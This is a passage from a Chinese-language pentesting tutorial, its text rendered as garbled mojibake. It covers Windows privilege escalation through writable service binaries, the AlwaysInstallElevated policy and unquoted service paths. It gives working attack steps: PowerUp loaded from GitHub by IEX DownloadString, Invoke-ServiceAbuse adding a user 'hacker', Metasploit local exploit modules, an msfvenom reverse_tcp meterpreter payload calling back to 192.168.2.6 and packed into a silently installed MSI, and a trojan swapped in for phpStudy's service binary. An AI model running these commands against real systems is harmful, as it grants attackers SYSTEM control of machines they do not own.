æœä¸€ä¸ª<strong>ä½æƒé™</strong>çš„ç”¨æˆ·å¯¹æ­¤ç±»ç³»ç»ŸæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶<strong>æ‹¥æœ‰å†™æƒé™</strong>ï¼Œå°±å¯ä»¥å°†è¯¥æ–‡ä»¶æ›¿æ¢æˆä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éšç€ç³»ç»ŸæœåŠ¡çš„å¯åŠ¨è·å¾—ç³»ç»Ÿæƒé™ã€‚</p>
<p>WindowsæœåŠ¡æ˜¯ä»¥Systemæƒé™è¿è¡Œçš„ï¼Œå›  æ­¤ï¼Œå…¶æ–‡ä»¶å¤¹ã€æ–‡ä»¶å’Œæ³¨å†Œè¡¨é”®å€¼éƒ½æ˜¯å—å¼ºè®¿é—®æ§åˆ¶æœºåˆ¶ä¿æŠ¤çš„ï¼Œä½†æ˜¯ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿä¸­ä»ç„¶å­˜åœ¨â€”äº›æ²¡æœ‰å¾—åˆ°æœ‰æ•ˆä¿æŠ¤çš„æœåŠ¡ã€‚  </p>
<p>ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯ï¼ˆå¯å†™ç›®å½•æ¼æ´ï¼‰æœ‰å¦‚ä¸‹ä¸¤ç§å¯èƒ½ï¼š</p>
<ul>
<li><p>æœåŠ¡æœªè¿è¡Œï¼š</p>
<p>æ”»å‡»è€…ä¼šä½¿ç”¨ä»»æ„æœåŠ¡æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œç„¶åé‡å¯æœåŠ¡ã€‚ </p>
</li>
<li><p>æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•è¢«ç»ˆæ­¢ï¼š</p>
<p>è¿™ç§æƒ…å†µç¬¦åˆç»å¤§å¤šæ•°çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨ DLLåŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡æ¥ææƒã€‚</p>
</li>
</ul>
<h4 id="1-PowerUp"><a href="#1-PowerUp" class="headerlink" title="1. PowerUp"></a>1. PowerUp</h4><pre><code class="hljs powershell"><span class="hljs-comment">#æœ¬åœ°å¯¼å…¥æ‰§è¡Œ</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span>

<span class="hljs-comment">#è¿œç¨‹åŠ è½½</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span>

<span class="hljs-comment">#æœ¬åœ°ä¸‹è½½æ‰§è¡Œ</span>
powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;C:\PowerUp.ps1&#x27;);Invoke-AllChecks&quot;</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220119221206512.png" alt="image-20220119221206512"></p>
<p><code>PowerUp</code> åˆ—å‡ºäº†å¯èƒ½å­˜åœ¨é—®é¢˜çš„æ‰€æœ‰æœåŠ¡ï¼Œå¹¶åœ¨ <code>AbuseFunction</code> éƒ¨åˆ†ç›´æ¥ç»™å‡ºäº† åˆ©ç”¨æ–¹å¼ã€‚åœ¨è¿™é‡Œæ£€æµ‹å‡ºå­˜åœ¨<code>ADWS</code>æœåŠ¡æ¼æ´ï¼ŒPathå€¼ä¸ºè¯¥æœåŠ¡çš„å¯æ‰§è¡Œç¨‹åºçš„è·¯å¾„ã€‚</p>
<pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Invoke-ServiceAbuse</span> <span class="hljs-literal">-ServiceName</span> <span class="hljs-string">&quot;ADWS&quot;</span> hacker <span class="hljs-literal">-Password</span> Passw0<span class="hljs-built_in">rd</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220119221841489.png" alt="image-20220119221841489"></p>
<h4 id="2-MetaSploit"><a href="#2-MetaSploit" class="headerlink" title="2. MetaSploit"></a>2. MetaSploit</h4><p>å¯¹åº”çš„åˆ©ç”¨æ¨¡å—æ˜¯service_permissionsã€‚é€‰æ‹© â€œAGGRESSIVEâ€ é€‰é¡¹ï¼Œå¯ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šæ¯-ä¸ªæœ‰ç¼ºé™·çš„æœåŠ¡ã€‚è¯¥é€‰é¡¹è¢«ç¦ç”¨æ—¶ï¼Œè¯¥æ¨¡å—åœ¨ç¬¬ä¸€æ¬¡ææƒæˆåŠŸåå°±ä¼šåœæ­¢å·¥ä½œã€‚</p>
<p>service_permissions æ¨¡å—ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥è·å¾—Systemæƒé™ï¼š</p>
<ul>
<li>å¦‚æœ<code>meterpreter</code>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œè¯¥æ¨¡å—ä¼šå°è¯•åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ªæ–°çš„æœåŠ¡ï¼›</li>
<li>å¦‚æœå½“å‰æƒé™ä¸å…è®¸åˆ›å»ºæœåŠ¡ï¼Œè¯¥æ¨¡å—ä¼šåˆ¤æ–­å“ªäº› æœåŠ¡çš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹çš„æƒé™æœ‰é—®é¢˜ï¼Œå¹¶å…è®¸å¯¹å…¶è¿›è¡ŒåŠ«æŒã€‚åœ¨åˆ›å»ºæœåŠ¡æˆ–è€…åŠ«æŒå·²ç»å­˜åœ¨çš„æœåŠ¡æ—¶ï¼Œè¯¥æ¨¡å—ä¼šåˆ›å»ºâ€”ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œå…¶æ–‡ä»¶åå’Œå®‰è£…è·¯å¾„éƒ½æ˜¯éšæœºçš„ã€‚</li>
</ul>
<p>æ‰§è¡Œ â€œrunâ€ å‘½ä»¤ï¼Œä¼šè‡ªåŠ¨åå¼¹â€”ä¸ªæ–°çš„meterpreterï¼ˆSystemæƒé™ï¼‰ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122153058605.png" alt="image-20220122153058605"></p>
<h3 id="4-2-2-æ³¨å†Œè¡¨é”®AlwaysInstallElevated"><a href="#4-2-2-æ³¨å†Œè¡¨é”®AlwaysInstallElevated" class="headerlink" title="4.2.2 æ³¨å†Œè¡¨é”®AlwaysInstallElevated"></a>4.2.2 æ³¨å†Œè¡¨é”®<code>AlwaysInstallElevated</code></h3><p>æ³¨å†Œè¡¨é”®<code>AlwaysInstallElevated</code>æ˜¯â€”ä¸ªç­–ç•¥è®¾ç½®é¡¹ã€‚windowså…è®¸ä½æƒé™ç”¨æˆ·ä»¥Systemæƒé™è¿è¡Œå®‰è£…æ–‡ä»¶ã€‚å¦‚æœå¯ç”¨æ­¤ç­–ç•¥è®¾ç½®é¡¹ï¼Œé‚£ä¹ˆä»»ä½•æƒé™çš„ç”¨æˆ·éƒ½èƒ½ä»¥ <code>NTAUTHORITY\SYSTEM</code>æƒé™æ¥å®‰è£…æ¶æ„çš„<code>MSI(MicrosoRWindowsInstaller)</code>æ–‡ä»¶ã€‚</p>
<h4 id="1-PathsAlwaysInstallElevated-æ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#1-PathsAlwaysInstallElevated-æ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="1. PathsAlwaysInstallElevated æ¼æ´äº§ç”Ÿçš„åŸå› "></a>1. <code>PathsAlwaysInstallElevated</code> æ¼æ´äº§ç”Ÿçš„åŸå› </h4><p>â€‹        åŸå› ï¼šç”¨æˆ·å¼€å¯äº†<code>WindowsInstaller</code>ç‰¹æƒå®‰è£…åŠŸèƒ½</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122154749267.png" alt="image-20220122154749267"></p>
<p>åœ¨ â€œè¿è¡Œâ€ è®¾ç½®æ¡†ä¸­è¾“å…¥ â€œgpedit.mscâ€ï¼Œæ‰“å¼€ç»„ç­–ç•¥ç¼–è¾‘å™¨ã€‚</p>
<ul>
<li>ç»„ç­–ç•¥ä¸€è®¡ç®—æœºé…ç½®â€”ç®¡ç†æ¨¡æ¿â€”Windows ç»„ä»¶â€”Windows Installerâ€”æ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œ<br>å®‰è£…ï¼šé€‰æ‹©å¯ç”¨ã€‚</li>
<li>ç»„ç­–ç•¥â€”ç”¨æˆ·é…ç½®â€”ç®¡ç†æ¨¡æ¿ä¸€Windows ç»„ä»¶â€”Windows Installerâ€”æ°¸è¿œä»¥é«˜ç‰¹æƒè¿›è¡Œå®‰<br>è£…ï¼šé€‰æ‹©å¯ç”¨ã€‚</li>
</ul>
<p>è®¾ç½®å®Œæ¯•ï¼Œä¼šåœ¨æ³¨å†Œè¡¨çš„ä»¥ä¸‹ä¸¤ä¸ªä½ç½®è‡ªåŠ¨åˆ›å»ºé”®å€¼â€œ1â€ã€‚</p>
<ul>
<li><code>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstall Elevated</code></li>
<li><code>HKEY LOCAL MACHINE\SOFTWARE\Policies Microsoft\Windows\Installer\AlwaysInstall Elevated</code></li>
</ul>
<pre><code class="hljs powershell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>

<h4 id="2-Windows-Installer-çš„ç›¸å…³çŸ¥è¯†ç‚¹"><a href="#2-Windows-Installer-çš„ç›¸å…³çŸ¥è¯†ç‚¹" class="headerlink" title="2. Windows Installer çš„ç›¸å…³çŸ¥è¯†ç‚¹"></a>2. Windows Installer çš„ç›¸å…³çŸ¥è¯†ç‚¹</h4><p>â€‹    Windows Installer æ˜¯ Windowsæ“ä½œç³»ç»Ÿçš„ç»„ä»¶ä¹‹ä¸€ï¼Œä¸“é—¨ç”¨æ¥ç®¡ç†å’Œé…ç½®è½¯ä»¶æœåŠ¡ã€‚Windows Installeré™¤äº†æ˜¯ä¸€ä¸ªå®‰è£…ç¨‹åºï¼Œè¿˜ç”¨äºç®¡ç†è½¯ä»¶çš„å®‰è£…ã€ç®¡ç†è½¯ä»¶ç»„ä»¶çš„æ·»åŠ å’Œåˆ é™¤ã€ç›‘è§†æ–‡ä»¶çš„è¿˜åŸã€é€šè¿‡å›æ»šè¿›è¡Œç¾éš¾æ¢å¤ç­‰ã€‚<br>â€‹    Windows Installer åˆ†ä¸ºå®¢æˆ·ç«¯å®‰è£…æœåŠ¡ï¼ˆMsiexec.exeï¼‰å’ŒMSIæ–‡ä»¶ä¸¤éƒ¨åˆ†ï¼Œå®ƒä»¬æ˜¯ä¸€èµ·å·¥ä½œçš„ã€‚Windows Installer é€šè¿‡ Msiexec.exe å®‰è£… MSI æ–‡ä»¶åŒ…å«çš„ç¨‹åºã€‚MSI æ–‡ä»¶æ˜¯ Windows Installerçš„æ•°æ®åŒ…ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ•°æ®åº“ï¼ŒåŒ…å«å®‰è£…å’Œå¸è½½è½¯ä»¶æ—¶éœ€è¦ä½¿ç”¨çš„å¤§é‡æŒ‡ä»¤å’Œæ•°æ®ã€‚Msiexec.exe ç”¨äºå®‰è£… MSIæ–‡ä»¶ï¼Œä¸€èˆ¬åœ¨è¿è¡ŒMicrosoft Update å®‰è£…æ›´æ–°æˆ–è€…å®‰è£…ä¸€äº›è½¯ä»¶çš„æ—¶å€™ä½¿ç”¨ï¼Œå ç”¨å†…å­˜è¾ƒå¤šã€‚ç®€å•åœ°è¯´ï¼ŒåŒå‡» MSIæ–‡ä»¶å°±ä¼šè¿è¡ŒMsiexec.exeã€‚</p>
<h4 id="3-PowerUpä¸‹çš„å®æˆ˜åˆ©ç”¨"><a href="#3-PowerUpä¸‹çš„å®æˆ˜åˆ©ç”¨" class="headerlink" title="3. PowerUpä¸‹çš„å®æˆ˜åˆ©ç”¨"></a>3. PowerUpä¸‹çš„å®æˆ˜åˆ©ç”¨</h4><p>åœ¨è¿™é‡Œï¼Œå¯ä»¥ä½¿ç”¨PowerUpçš„<code>Get-RegistryAlwaysInstallElevated</code>æ¨¡å—æ¥æ£€æŸ¥æ³¨å†Œè¡¨é”®æ˜¯å¦è¢«è®¾ç½®ã€‚å¦‚æœ<code>AlwaysInstallElevated</code>æ³¨å†Œè¡¨é”®å·²ç»è¢«è®¾ç½®ï¼Œå°±æ„å‘³ç€MSIæ–‡ä»¶æ˜¯ä»¥Systemæƒé™è¿è¡Œçš„ã€‚è¿è¡Œè¯¥æ¨¡å—çš„å‘½ä»¤å¦‚ä¸‹ï¼Œâ€œTrueâ€è¡¨ç¤ºå·²ç»è®¾ç½®ã€‚</p>
<pre><code class="hljs powershell">powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-Object Net.Webclient).DownloadString(&#x27;.\PowerUp.ps1&#x27;);&quot;</span><span class="hljs-built_in">Get-RegistryAlwaysInstallElevated</span></code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122163617342.png" alt="image-20220122163617342"></p>
<p>æ·»åŠ ç”¨æˆ·ï¼Œè¿è¡Œ<code>Write-UserAddMSI</code>æ¨¡å—ï¼Œç”ŸæˆMSIæ–‡ä»¶å¹¶æ‰§è¡Œã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122164437187.png" alt="image-20220122164437187"></p>
<p>msiexec å‚æ•°è§£é‡Šï¼š</p>
<pre><code class="hljs powershell">å®‰è£…é€‰é¡¹
	&lt;/package | /i&gt; &lt;Product.msi&gt;
		å®‰è£…æˆ–é…ç½®äº§å“
	/a &lt;Product.msi&gt;
		ç®¡ç†å®‰è£… - åœ¨ç½‘ç»œä¸Šå®‰è£…äº§å“
	/j&lt;u|m&gt; &lt;Product.msi&gt; [/<span class="hljs-type">t</span> &lt;<span class="hljs-type">Transform</span> <span class="hljs-type">List</span>&gt;] [/<span class="hljs-type">g</span> &lt;<span class="hljs-type">Language</span> <span class="hljs-type">ID</span>&gt;]
		å…¬å¸ƒäº§å“ - m å…¬å¸ƒåˆ°æ‰€æœ‰ç”¨æˆ·ï¼Œu å…¬å¸ƒåˆ°å½“å‰ç”¨æˆ·
	&lt;/uninstall | /x&gt; &lt;Product.msi | ProductCode&gt;
		å¸è½½äº§å“
æ˜¾ç¤ºé€‰é¡¹
	/quiet
		å®‰é™æ¨¡å¼ï¼Œæ— ç”¨æˆ·äº¤äº’
	/passive
		æ— äººå‚ä¸æ¨¡å¼ - åªæ˜¾ç¤ºè¿›åº¦æ 
	/q[<span class="hljs-type">n</span>|<span class="hljs-type">b</span>|<span class="hljs-type">r</span>|<span class="hljs-type">f</span>]
		è®¾ç½®ç”¨æˆ·ç•Œé¢çº§åˆ«
		n - æ— ç”¨æˆ·ç•Œé¢
		b - åŸºæœ¬ç•Œé¢
		<span class="hljs-built_in">r</span> - ç²¾ç®€ç•Œé¢
		f - å®Œæ•´ç•Œé¢(é»˜è®¤å€¼)
æ›´æ–°é€‰é¡¹
	/update &lt;Update1.msp&gt;[;<span class="hljs-type">Update2.msp</span>]
		åº”ç”¨æ›´æ–°
	/uninstall &lt;PatchCodeGuid&gt;[;<span class="hljs-type">Update2.msp</span>] /package &lt;Product.msi | ProductCode&gt;
		åˆ é™¤äº§å“çš„æ›´æ–°</code></pre>

<h4 id="4-MetaSploitæ¨¡å—always-install-elevated"><a href="#4-MetaSploitæ¨¡å—always-install-elevated" class="headerlink" title="4. MetaSploitæ¨¡å—always_install_elevated"></a>4. MetaSploitæ¨¡å—<code>always_install_elevated</code></h4><pre><code class="hljs shell">use exploit/windows/local/always_install_elevated
set LHOST 192.168.2.6
set SESSION 1
run</code></pre>

<p>â€‹        <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122174614476.png" alt="image-20220122174614476"></p>
<h4 id="5-ç”¨Msi-Wrapperç”Ÿæˆmsiæ–‡ä»¶è¿›è¡Œææƒ"><a href="#5-ç”¨Msi-Wrapperç”Ÿæˆmsiæ–‡ä»¶è¿›è¡Œææƒ" class="headerlink" title="5. ç”¨Msi Wrapperç”Ÿæˆmsiæ–‡ä»¶è¿›è¡Œææƒ"></a>5. ç”¨Msi Wrapperç”Ÿæˆmsiæ–‡ä»¶è¿›è¡Œææƒ</h4><p>è¯¥è½¯ä»¶çš„ä¸»è¦ä½œç”¨å°±æ˜¯å°†<code>exe</code>è½¬åŒ–ä¸º<code>msi</code>æ–‡ä»¶ï¼Œä¸‹è½½åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://www.exemsi.com/download/">https://www.exemsi.com/download/</a></p>
<p>ä½¿ç”¨<code>MSFvenom</code>ç”Ÿæˆ <code>exec</code> æœ¨é©¬ï¼Œä¹‹åå†ä½¿ç”¨<code>MSI Wrapper</code> è¿›è¡Œæ‰“åŒ…ä¸º <code>MSI</code>ã€‚</p>
<pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.6 LPORT=4444 -f exe-only &gt;3.exe</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122181831460.png" alt="image-20220122181831460"></p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122181946241.png" alt="image-20220122181946241"></p>
<p>åˆ›å»ºä¸€ä¸ªæ–°çš„upgrade code ç»§ç»­ä¸‹ä¸€æ­¥å³å¯ï¼Œæœ€ç»ˆç”ŸæˆMSIçš„æ–‡ä»¶ï¼Œè¿è¡Œå³å¯ä¸Šçº¿ï¼Œæƒé™ç›´æ¥ä¸ºSYSTEMã€‚</p>
<pre><code class="hljs powershell">msiexec /qn /i <span class="hljs-number">3</span>.msi</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122182732528.png" alt="image-20220122182732528"></p>
<h4 id="6-åˆ©ç”¨MSFvenom"><a href="#6-åˆ©ç”¨MSFvenom" class="headerlink" title="6. åˆ©ç”¨MSFvenom"></a>6. åˆ©ç”¨MSFvenom</h4><p>ç”Ÿæˆmsiæ–‡ä»¶ï¼š</p>
<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> kaliæ‰§è¡Œ</span>
msfvenom -p windows/exec CMD=calc.exe -f msi &gt; calc.msi
<span class="hljs-meta">#</span><span class="bash"> ç›®æ ‡æœºå™¨è¿è¡ŒæŸ¥çœ‹æƒé™ä¸ºSYSTEM</span>
msiexec  /qn /i calc.msi
tasklist /v | findstr &quot;calc.exe&quot;</code></pre>

<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220122180904998.png" alt="image-20220122180904998"></p>
<h3 id="4-2-3-å¯ä¿¡ä»»çš„æœåŠ¡å™¨è·¯å¾„æ¼æ´"><a href="#4-2-3-å¯ä¿¡ä»»çš„æœåŠ¡å™¨è·¯å¾„æ¼æ´" class="headerlink" title="4.2.3 å¯ä¿¡ä»»çš„æœåŠ¡å™¨è·¯å¾„æ¼æ´"></a>4.2.3 å¯ä¿¡ä»»çš„æœåŠ¡å™¨è·¯å¾„æ¼æ´</h3><p>â€‹        å¯ä¿¡ä»»æœåŠ¡è·¯å¾„ï¼ˆåŒ…å«ç©ºæ ¼ä¸”æ²¡æœ‰å¼•å·çš„è·¯å¾„ï¼‰æ¼æ´åˆ©ç”¨äº† Windows æ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ï¼Œå¹¶æ¶‰åŠæœåŠ¡è·¯å¾„çš„æ–‡ä»¶/æ–‡ä»¶å¤¹æƒé™ï¼ˆå­˜åœ¨ç¼ºé™·çš„æœåŠ¡ç¨‹åºåˆ©ç”¨äº†å±äºå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶/æ–‡ä»¶å¤¹çš„æƒé™ï¼‰ã€‚å¦‚æœä¸€ä¸ªæœåŠ¡è°ƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰æ­£ç¡®åœ°å¤„ç†æ‰€å¼•ç”¨çš„å®Œæ•´è·¯å¾„åï¼Œè¿™ä¸ªæ¼æ´å°±ä¼šè¢«æ”»å‡»è€…ç”¨æ¥ä¸Šä¼ ä»»æ„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ä¸”åŒ…å«ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æ˜¯æœ‰æ¼æ´çš„ã€‚</p>
<p>è¯¥æ¼æ´å­˜åœ¨å¦‚ä¸‹ä¸¤ç§å¯èƒ½æ€§:</p>
<ul>
<li>å¦‚æœè·¯å¾„ä¸æœåŠ¡æœ‰å…³ï¼Œå°±ä»»æ„åˆ›å»ºä¸€ä¸ªæœåŠ¡æˆ–è€…ç¼–è¯‘Serviceæ¨¡æ¿ã€‚</li>
<li>å¦‚æœè·¯å¾„ä¸å¯æ‰§è¡Œæ–‡ä»¶æœ‰å…³ï¼Œå°±ä»»æ„åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
</ul>
<h4 id="1-Trusted-Service-Paths-æ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#1-Trusted-Service-Paths-æ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="1. Trusted Service Paths æ¼æ´äº§ç”Ÿçš„åŸå› "></a>1. Trusted Service Paths æ¼æ´äº§ç”Ÿçš„åŸå› </h4><p>â€‹        å› ä¸º Windows æœåŠ¡é€šå¸¸éƒ½æ˜¯ä»¥System æƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥ç³»ç»Ÿåœ¨è§£ææœåŠ¡æ‰€å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼æ—¶ï¼Œä¹Ÿä¼šä»¥ç³»ç»Ÿæƒé™è¿›è¡Œã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶è·¯å¾„<code>C:\Program Files\Some Folder\Service.exe</code>ã€‚å¯¹äºè¯¥è·¯å¾„ä¸­çš„æ¯ä¸€ä¸ªç©ºæ ¼ï¼ŒWindowséƒ½ä¼šå°è¯•å¯»æ‰¾å¹¶æ‰§è¡Œä¸ç©ºæ ¼å‰é¢çš„åå­—ç›¸åŒ¹é…çš„ç¨‹åºã€‚æ“ä½œç³»ç»Ÿä¼šå¯¹æ–‡ä»¶è·¯å¾„ä¸­ç©ºæ ¼çš„æ‰€æœ‰å¯èƒ½æƒ…å†µè¿›è¡Œå°è¯•ï¼Œç›´è‡³æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸåŒ¹é…çš„ç¨‹åºã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li><code>C:\Program.exe</code></li>
<li><code>C:\ProgramFiles\Some.exe</code></li>
<li><code>C:\ProgramFiles\SomeFolder\Service.exe</code></li>
</ul>
<p>å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªè¢« â€œ<strong>é€‚å½“</strong>â€ å‘½åçš„å¯æ‰§è¡Œç¨‹åºè¢«ä¸Šä¼ åˆ°å—å½±å“çš„ç›®å½•ä¸­ï¼ŒæœåŠ¡ä¸€æ—¦é‡å¯ï¼Œè¯¥ç¨‹åºå°±ä¼šä»¥System æƒé™è¿è¡Œï¼ˆåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼‰ã€‚</p>
<h4 id="2-MetaSploitæ¨¡å—trusted-service-path"><a href="#2-MetaSploitæ¨¡å—trusted-service-path" class="headerlink" title="2. MetaSploitæ¨¡å—trusted_service_path"></a>2. MetaSploitæ¨¡å—<code>trusted_service_path</code></h4><p>â€‹        ä½¿ç”¨<code>WMIC</code>è¿›è¡Œæ¼æ´æ£€æµ‹ï¼Œ<strong>æœåŠ¡æ‰€å¯¹åº”çš„è·¯å¾„æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥ï¼Œä¸”è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼</strong>ï¼š</p>
<pre><code class="hljs powershell"><span class="hljs-comment"># è¿™ä¸ªåªæ˜¯ç²—ç•¥ç­›é€‰ï¼ŒæœåŠ¡è·¯å¾„æ˜¯å¦åŒ…å«ç©ºæ ¼è¿˜è¦è‡ªè¡Œåˆ¤æ–­</span>
wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">icacls &quot;</span>C:\Program Files\phpstudy\phpstudy_pro\\<span class="hljs-string">&quot;</span></code></pre>

<p>ä¹‹åä½¿ç”¨Windowsçš„å†…ç½®å·¥å…·<code>icacls</code>å¯¹ç›®å½•æƒé™è¿›è¡Œåˆ¤æ–­ï¼Œä¸»è¦åˆ¤æ–­æ˜¯å¦å¯å†™ã€‚æœ¬æ¬¡ä»¥<code>phpstudy</code>ä¸ºä¾‹ï¼ŒæŸ¥çœ‹æƒé™(<code>BUILTIN</code>ä»£è¡¨æœ¬åœ°ç»„)ï¼š</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124223922142.png" alt="image-20220124223922142"></p>
<p><code>Everyone:(OI)(CI)(F)</code>çš„æ„æ€æ˜¯ï¼Œå¯¹è¯¥æ–‡ä»¶å¤¹ï¼Œç”¨æˆ·æœ‰è¯»ã€å†™ã€åˆ é™¤å…¶ä¸‹æ–‡ä»¶ã€åˆ é™¤å…¶å­ç›®å½•çš„æƒé™ã€‚</p>
<ul>
<li>Everyoneï¼šç”¨æˆ·å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å…·æœ‰ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å¤¹çš„æƒé™- </li>
<li>(M)ï¼šä¿®æ”¹æƒé™</li>
<li>(F)ï¼šå®Œå…¨è®¿é—®æƒé™</li>
<li>(CI)ï¼šå®¹å™¨ç»§æ‰¿ï¼Œä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</li>
<li>(OI)ï¼šå¯¹è±¡ç»§æ‰¿ï¼Œä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</li>
</ul>
<p>ä¹‹åæ›¿æ¢æœåŠ¡ï¼Œå°†åé—¨æ–‡ä»¶å‘½åä¸ºåŸæœåŠ¡æ–‡ä»¶ï¼Œé‡å¯æœåŠ¡å³å¯è·å–SYSTEMæƒé™çš„shellï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨æ¨¡å—<code>exploit/windows/local/trusted_service_path</code>ç›´æ¥åˆ©ç”¨ï¼‰ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124225715368.png" alt="image-20220124225715368"></p>
<pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> stop phpStudySrv
<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> phpStudySrv</code></pre>

<p>å…¶ä¸­<code>phpStudyServer.exe</code>ä¸ºæœ¨é©¬æ–‡ä»¶ï¼Œ<code>phpStudyServer_bak.exe</code> ä¸ºåŸæœåŠ¡çš„å¤‡ä»½æ–‡ä»¶ã€‚</p>
<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220124225918498.png" alt="image-20220124225918498"></p>
